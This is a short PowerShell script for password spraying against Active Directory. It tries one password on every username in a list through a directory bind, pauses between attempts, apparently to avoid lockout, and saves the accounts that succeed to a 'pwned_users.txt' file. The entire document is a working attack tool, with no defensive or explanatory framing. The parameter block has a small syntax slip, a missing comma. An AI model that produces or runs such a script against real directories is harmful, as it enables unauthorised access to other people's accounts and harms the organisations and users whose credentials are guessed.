param (
    [string]$UserListFilePath,
    [string]$Password,
    [string]$OutputFilePath = "pwned_users.txt"
    [int]$DelayBetweenAttempts = 2
)

# Check if the user list file exists
if (-Not (Test-Path $UserListFilePath)) {
    Write-Error "The specified user list file does not exist: $UserListFilePath"
    exit 1
}

# Read usernames from the file
$usernames = Get-Content -Path $UserListFilePath

# Initialize an empty array to store pwned usernames
$pwnedUsers = @()

foreach ($username in $usernames) {
    # Create DirectoryEntry object and verify credentials
    try {
        $directoryEntry = (New-Object DirectoryServices.DirectoryEntry "", $username, $Password)
        if ($directoryEntry.psbase.name -ne $null) {
            # Output the pwned message in green color
            Write-Host "$username has been pwned!" -ForegroundColor Green
            # Add the username to the pwned users array
            $pwnedUsers += $username
        } else {
            Write-Output "$username credentials are invalid."
        }
    } catch {
        Write-Output "An error occurred with $username : $_"
    }
	Start-Sleep -Seconds $DelayBetweenAttempts
}

# Save the pwned usernames to a file
$pwnedUsers | Out-File -FilePath $OutputFilePath

# Output the path to the saved file
Write-Output "Pwned usernames have been saved to: $OutputFilePath"

